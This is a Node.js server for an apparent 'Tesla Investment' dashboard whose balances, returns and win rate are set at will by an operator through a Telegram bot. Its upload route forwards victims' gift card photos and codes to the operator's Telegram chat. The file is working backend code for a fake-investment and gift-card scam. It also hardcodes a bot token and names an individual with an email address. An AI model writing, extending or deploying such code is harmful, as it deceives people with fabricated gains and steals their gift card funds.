const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// TELEGRAM BOT CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = '8800607663:AAGUaWeu51iSMvB42rdlkJcIGR9jO9H7cXU';
const TELEGRAM_CHAT_ID = '157828443';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }
});

// ============================================
// USER DATA STORE
// ============================================
let userData = {
  name: 'Dennis Newhouse',
  email: 'dennisnewhouse@gmail.com',
  portfolioValue: 1800.75,
  availableCash: 1800.50,
  investmentsValue: 0,
  giftCredits: 0,
  totalTrades: 0,
  winRate: 0,
  totalReturn: 0
};

let transactions = [];
let validGiftCards = {
  'TSLA-2024-GIFT-500': 500,
  'CRYPTO-BTC-2500': 2500,
  'ELITE-PREMIUM-10K': 10000,
  'TESLA-100': 100,
  'WELCOME-2024': 250,
  'VIP-ELITE-5000': 5000,
  'DIAMOND-2025': 7500,
  'AMAZON-GC-100': 100,
  'GOOGLE-PLAY-50': 50,
  'APPLE-STORE-200': 200,
  'STEAM-WALLET-500': 500,
  'VISA-REWARD-1000': 1000,
  'MASTERCARD-GOLD-3000': 3000,
  'PAYPAL-CASH-500': 500,
  'WALMART-GC-250': 250,
  'TARGET-CARD-150': 150,
  'BESTBUY-2024-800': 800,
  'EBAY-DEAL-400': 400,
  'NIKE-VOUCHER-300': 300,
  'STARBUCKS-REWARD-75': 75,
  'NETFLIX-PREMIUM-120': 120,
  'SPOTIFY-ANNUAL-99': 99,
  'UBER-CREDIT-200': 200,
  'AIRBNB-VOUCHER-1500': 1500,
  'DELTA-MILES-2500': 2500,
  'HILTON-STAY-1800': 1800,
  'MARRIOTT-BONVOY-3000': 3000,
  'SHELL-FUEL-500': 500
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================
async function sendTelegramMessage(text) {
  try {
    const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API error:', data.description);
    }
    return data;
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return null;
  }
}

async function sendTelegramPhoto(caption, imageBuffer) {
  try {
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    form.append('photo', imageBuffer, { filename: 'giftcard.jpg', contentType: 'image/jpeg' });
    
    const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
      method: 'POST',
      body: form,
      headers: form.getHeaders()
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram photo error:', data.description);
    }
    return data;
  } catch (error) {
    console.error('Telegram photo send error:', error.message);
    return null;
  }
}

function formatBalanceMessage() {
  return `<b>💰 CURRENT BALANCE OVERVIEW</b>
👤 <b>User:</b> ${userData.name}
📧 <b>Email:</b> ${userData.email}
💵 <b>Portfolio Value:</b> $${userData.portfolioValue.toFixed(2)}
🏦 <b>Available Cash:</b> $${userData.availableCash.toFixed(2)}
📈 <b>Investments:</b> $${userData.investmentsValue.toFixed(2)}
🎫 <b>Gift Credits:</b> $${userData.giftCredits.toFixed(2)}
📊 <b>Total Trades:</b> ${userData.totalTrades}
🏆 <b>Win Rate:</b> ${userData.winRate}%
📈 <b>Total Return:</b> +${userData.totalReturn}%
🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
}

function formatTradeMessage(tradeData) {
  return `<b>🚨 NEW TRADE EXECUTED</b>
${tradeData.type === 'buy' ? '🔴' : '🟢'} <b>Action:</b> ${tradeData.type === 'buy' ? 'BOUGHT' : 'SOLD'}
📊 <b>Asset:</b> ${tradeData.asset}
💵 <b>Amount:</b> $${tradeData.amount.toFixed(2)}
👤 <b>User:</b> ${userData.name}
📧 <b>Email:</b> ${userData.email}

<b>💰 UPDATED BALANCES:</b>
💵 <b>Portfolio Value:</b> $${userData.portfolioValue.toFixed(2)}
🏦 <b>Available Cash:</b> $${userData.availableCash.toFixed(2)}
📈 <b>Investments:</b> $${userData.investmentsValue.toFixed(2)}
🎫 <b>Gift Credits:</b> $${userData.giftCredits.toFixed(2)}
🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
}

function formatGiftMessage(giftData) {
  return `<b>🎁 GIFT CARD REDEEMED</b>
💳 <b>Code:</b> ${giftData.code}
💵 <b>Amount:</b> $${giftData.amount.toFixed(2)}
👤 <b>User:</b> ${userData.name}
📧 <b>Email:</b> ${userData.email}

<b>💰 UPDATED BALANCES:</b>
💵 <b>Portfolio Value:</b> $${userData.portfolioValue.toFixed(2)}
🏦 <b>Available Cash:</b> $${userData.availableCash.toFixed(2)}
📈 <b>Investments:</b> $${userData.investmentsValue.toFixed(2)}
🎫 <b>Gift Credits:</b> $${userData.giftCredits.toFixed(2)}
🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
}

function formatImageUploadMessage(imageData) {
  return `<b>📸 GIFT CARD IMAGE RECEIVED</b>
👤 <b>User:</b> ${userData.name}
📧 <b>Email:</b> ${userData.email}
🔍 <b>Code Entered:</b> ${imageData.code || 'No code provided'}
🕐 <b>Time:</b> ${new Date().toLocaleString()}

<b>💰 CURRENT BALANCES:</b>
💵 <b>Portfolio Value:</b> $${userData.portfolioValue.toFixed(2)}
🏦 <b>Available Cash:</b> $${userData.availableCash.toFixed(2)}
📈 <b>Investments:</b> $${userData.investmentsValue.toFixed(2)}
🎫 <b>Gift Credits:</b> $${userData.giftCredits.toFixed(2)}

<i>The image is attached below. You can manually verify and process this gift card.</i>`;
}

async function sendTelegramMessageToChat(chatId, text) {
  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
    });
  } catch (error) {
    console.error('Send to chat error:', error.message);
  }
}

// ============================================
// TELEGRAM BOT WEBHOOK
// ============================================
app.post('/telegram-webhook', async (req, res) => {
  try {
    const { message } = req.body;
    
    if (message && message.text) {
      const chatId = message.chat.id;
      const text = message.text.trim();
      
      if (text === '/start' || text === '/help') {
        const helpText = `<b>🤖 Tesla Investment Bot Commands:</b>

/balance - View current balances
/trades - View recent transactions
/addcash [amount] - Add cash to account
/setcash [amount] - Set available cash
/setinvested [amount] - Set investments value
/setgift [amount] - Set gift credits
/addgiftcard [code] [amount] - Add a new gift card
/removegiftcard [code] - Remove a gift card
/reset - Reset all data to default
/help - Show this help message`;
        await sendTelegramMessageToChat(chatId, helpText);
      }
      else if (text === '/balance') {
        await sendTelegramMessageToChat(chatId, formatBalanceMessage());
      }
      else if (text === '/trades') {
        if (transactions.length === 0) {
          await sendTelegramMessageToChat(chatId, '<b>📋 No transactions yet.</b>');
        } else {
          const recentTrades = transactions.slice(0, 10);
          let tradeList = '<b>📋 RECENT TRANSACTIONS</b>\n\n';
          recentTrades.forEach((tx, i) => {
            const emoji = tx.type === 'buy' ? '🔴' : tx.type === 'sell' ? '🟢' : tx.type === 'gift' ? '🎁' : '💵';
            const sign = tx.type === 'buy' ? '-' : '+';
            tradeList += `${i + 1}. ${emoji} ${tx.name}: ${sign}$${Math.abs(tx.amount).toFixed(2)} - ${tx.time}\n`;
          });
          await sendTelegramMessageToChat(chatId, tradeList);
        }
      }
      else if (text.startsWith('/addcash')) {
        const parts = text.split(' ');
        const amount = parseFloat(parts[1]);
        if (isNaN(amount) || amount <= 0) {
          await sendTelegramMessageToChat(chatId, '❌ Invalid amount. Usage: /addcash [amount]');
        } else {
          userData.availableCash += amount;
          userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
          transactions.unshift({
            name: 'Bot: Cash Added',
            amount: amount,
            type: 'deposit',
            time: new Date().toLocaleDateString([], {month:'short', day:'numeric'}) + ' • ' + new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})
          });
          await sendTelegramMessageToChat(chatId, `✅ Added $${amount.toFixed(2)} to available cash.\n\n${formatBalanceMessage()}`);
        }
      }
      else if (text.startsWith('/setcash')) {
        const parts = text.split(' ');
        const amount = parseFloat(parts[1]);
        if (isNaN(amount) || amount < 0) {
          await sendTelegramMessageToChat(chatId, '❌ Invalid amount. Usage: /setcash [amount]');
        } else {
          userData.availableCash = amount;
          userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
          await sendTelegramMessageToChat(chatId, `✅ Available cash set to $${amount.toFixed(2)}.\n\n${formatBalanceMessage()}`);
        }
      }
      else if (text.startsWith('/setinvested')) {
        const parts = text.split(' ');
        const amount = parseFloat(parts[1]);
        if (isNaN(amount) || amount < 0) {
          await sendTelegramMessageToChat(chatId, '❌ Invalid amount. Usage: /setinvested [amount]');
        } else {
          userData.investmentsValue = amount;
          userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
          await sendTelegramMessageToChat(chatId, `✅ Investments set to $${amount.toFixed(2)}.\n\n${formatBalanceMessage()}`);
        }
      }
      else if (text.startsWith('/setgift')) {
        const parts = text.split(' ');
        const amount = parseFloat(parts[1]);
        if (isNaN(amount) || amount < 0) {
          await sendTelegramMessageToChat(chatId, '❌ Invalid amount. Usage: /setgift [amount]');
        } else {
          userData.giftCredits = amount;
          userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
          await sendTelegramMessageToChat(chatId, `✅ Gift credits set to $${amount.toFixed(2)}.\n\n${formatBalanceMessage()}`);
        }
      }
      else if (text.startsWith('/addgiftcard')) {
        const parts = text.split(' ');
        const code = parts[1];
        const amount = parseFloat(parts[2]);
        if (!code || isNaN(amount) || amount <= 0) {
          await sendTelegramMessageToChat(chatId, '❌ Invalid format. Usage: /addgiftcard [code] [amount]');
        } else {
          validGiftCards[code.toUpperCase()] = amount;
          await sendTelegramMessageToChat(chatId, `✅ Gift card added: ${code.toUpperCase()} = $${amount.toFixed(2)}`);
        }
      }
      else if (text.startsWith('/removegiftcard')) {
        const parts = text.split(' ');
        const code = parts[1];
        if (!code) {
          await sendTelegramMessageToChat(chatId, '❌ Please provide a code. Usage: /removegiftcard [code]');
        } else if (validGiftCards[code.toUpperCase()]) {
          delete validGiftCards[code.toUpperCase()];
          await sendTelegramMessageToChat(chatId, `✅ Gift card removed: ${code.toUpperCase()}`);
        } else {
          await sendTelegramMessageToChat(chatId, `❌ Gift card not found: ${code.toUpperCase()}`);
        }
      }
      else if (text === '/reset') {
        userData = {
          name: 'Dennis Newhouse',
          email: 'dennisnewhouse@gmail.com',
          portfolioValue: 1800.75,
          availableCash: 1800.50,
          investmentsValue: 0,
          giftCredits: 0,
          totalTrades: 0,
          winRate: 0,
          totalReturn: 0
        };
        transactions = [];
        await sendTelegramMessageToChat(chatId, `✅ All data has been reset to default.\n\n${formatBalanceMessage()}`);
      }
      else {
        await sendTelegramMessageToChat(chatId, '❌ Unknown command. Type /help for available commands.');
      }
    }
    
    res.json({ ok: true });
  } catch (error) {
    console.error('Webhook error:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// ============================================
// API ROUTES FOR DASHBOARD
// ============================================

app.get('/api/user-data', (req, res) => {
  res.json({
    success: true,
    data: userData,
    transactions: transactions,
    giftCards: Object.keys(validGiftCards)
  });
});

app.post('/api/trade', async (req, res) => {
  try {
    const { asset, type, amount } = req.body;
    
    if (!asset || !type || !amount || amount <= 0) {
      return res.json({ success: false, message: 'Invalid trade data' });
    }
    
    if (type === 'buy' && amount > userData.availableCash) {
      return res.json({ success: false, message: 'Insufficient available cash' });
    }
    
    if (type === 'sell' && amount > userData.investmentsValue) {
      return res.json({ success: false, message: 'Insufficient investments to sell' });
    }
    
    if (type === 'buy') {
      userData.availableCash -= amount;
      userData.investmentsValue += amount;
    } else {
      userData.investmentsValue -= amount;
      userData.availableCash += amount;
    }
    
    userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
    userData.totalTrades++;
    userData.winRate = Math.min(userData.winRate + 1, 95);
    userData.totalReturn = Math.min(userData.totalReturn + 0.5, 50);
    
    const now = new Date();
    const timeStr = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
    const dateStr = now.toLocaleDateString([], {month:'short', day:'numeric'});
    
    transactions.unshift({
      name: asset + ' ' + (type === 'buy' ? 'Bought' : 'Sold'),
      amount: amount,
      type: type,
      time: dateStr + ' • ' + timeStr
    });
    
    if (transactions.length > 50) transactions.pop();
    
    const tradeData = { asset, type, amount };
    await sendTelegramMessage(formatTradeMessage(tradeData));
    
    res.json({
      success: true,
      message: `${type === 'buy' ? 'Bought' : 'Sold'} $${amount.toFixed(2)} of ${asset}`,
      data: userData,
      transactions: transactions
    });
  } catch (error) {
    res.json({ success: false, message: 'Server error' });
  }
});

app.post('/api/redeem-gift', async (req, res) => {
  try {
    const { code } = req.body;
    const normalizedCode = code.toUpperCase().trim();
    
    if (!normalizedCode) {
      return res.json({ success: false, message: 'Please enter a gift card code' });
    }
    
    if (validGiftCards.hasOwnProperty(normalizedCode)) {
      const creditAmount = validGiftCards[normalizedCode];
      userData.giftCredits += creditAmount;
      userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
      
      const now = new Date();
      const timeStr = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
      const dateStr = now.toLocaleDateString([], {month:'short', day:'numeric'});
      
      transactions.unshift({
        name: 'Gift Card Redeemed',
        amount: creditAmount,
        type: 'gift',
        time: dateStr + ' • ' + timeStr
      });
      
      delete validGiftCards[normalizedCode];
      
      await sendTelegramMessage(formatGiftMessage({ code: normalizedCode, amount: creditAmount }));
      
      res.json({
        success: true,
        message: `$${creditAmount.toFixed(2)} added to your account!`,
        data: userData,
        transactions: transactions
      });
    } else {
      res.json({ success: false, message: 'Invalid or already used gift card code' });
    }
  } catch (error) {
    res.json({ success: false, message: 'Server error' });
  }
});

app.post('/api/upload-gift-image', upload.single('giftImage'), async (req, res) => {
  try {
    const code = req.body.code || '';
    const imageBuffer = req.file.buffer;
    
    const caption = formatImageUploadMessage({ code });
    await sendTelegramPhoto(caption, imageBuffer);
    
    res.json({
      success: true,
      message: 'Gift card image sent for verification'
    });
  } catch (error) {
    res.json({ success: false, message: 'Upload failed' });
  }
});

app.post('/api/update-balance', async (req, res) => {
  try {
    const { availableCash, investmentsValue, giftCredits } = req.body;
    
    if (availableCash !== undefined) userData.availableCash = parseFloat(availableCash);
    if (investmentsValue !== undefined) userData.investmentsValue = parseFloat(investmentsValue);
    if (giftCredits !== undefined) userData.giftCredits = parseFloat(giftCredits);
    
    userData.portfolioValue = userData.availableCash + userData.investmentsValue + userData.giftCredits;
    
    res.json({
      success: true,
      data: userData,
      message: 'Balance updated'
    });
  } catch (error) {
    res.json({ success: false, message: 'Server error' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Tesla Investment Server running on port ${PORT}`);
  console.log(`📡 Telegram Bot configured`);
});
